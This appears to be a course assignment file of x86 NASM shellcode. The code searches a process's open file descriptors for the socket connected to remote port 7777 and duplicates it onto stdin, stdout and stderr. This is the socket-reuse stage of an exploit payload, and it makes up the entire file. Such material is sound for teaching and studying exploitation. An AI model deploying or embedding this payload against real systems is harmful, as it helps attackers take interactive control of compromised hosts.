; nasm -f bin findsckcode.asm
;find socket connect to remote port NNNN

;--------------------------------------------
; Name: 
; Class: CS4678
; Assignment 5
; File: findsckcode.asm
; Last modified: 14 Feb 2012
;---------------------------------------------
;

;syscall     eax ebx,ecx,edx
;----------- ---- ---------------------------------------------------------------
;socketcall  x066 getpeername=7,->[sfd,->sadr=[],->[len=0x10]]
;dup2        x03f sfd,fd={2,1,0}

USE32

SYS_GETPEERNAME equ 7
SYS_SOCKETCALL equ 0x66
SYS_DUP2 equ 0x3f

REMOTE_PORT equ 0x1e61     ; expected remote port number 7777 = 1e61

ATTACKER_SRC_PORT equ 46   ; offset into shell code at which to insert your
                           ; source port number *((short*)(sc+46)) = sa.sin_port 

findsckcode:
   xor     ebx,ebx
   mov     edi,esp         ;
   lea     esi,[edi+16]    ;esi = &sockaddr_in
   mov     [edi+4],esi     ;arg_1 == &sa
   lea     ecx,[edi+32]    ;ecx = &len
   mov     [edi+8],ecx     ;arg_2 == &len
   mov     bl,16           ;sizeof(sockaddr_in)
   mov     [ecx],ebx       ;len = sizeof(sockaddr_in)
   xor     ecx,ecx
   mov     cl,0xff         ;count down from fd 255
loop_top:
   mov     [edi],ecx       ;arg_0 == fd
   push    ecx             ;save the count
   xor     eax,eax
   mov     al,SYS_SOCKETCALL
   mov     bl,SYS_GETPEERNAME
   mov     ecx,edi         ;parms*
   int     0x80
   pop     ecx             ;retrieve the count
   xor     ebx,ebx
   cmp     ebx,eax         ;success?
   jnz     loop_bottom     ;invalid fd, jump to loop_bottom
   inc     edx
   mov     bx,REMOTE_PORT
   cmp     [esi+2],bx      ;compare the port number of fd to expected
   je      loop_end        ;found it so, jump to loop_end
loop_bottom:
   loop    loop_top        ;didn't find it so jump to loop_top
loop_end:
   mov     ebx,ecx         ;fd into ebx
   xor     ecx,ecx
   mov     cl,3
dup_loop:                  ;dup2 stderr, stdout, stdin
   xor     eax,eax
   mov     al,SYS_DUP2
   dec     ecx
   int     0x80
   inc     ecx
   loop    dup_loop
;at this point we have located the socket fd used to connect and pass
;the shellcode and dup'ed it onto 0,1,2

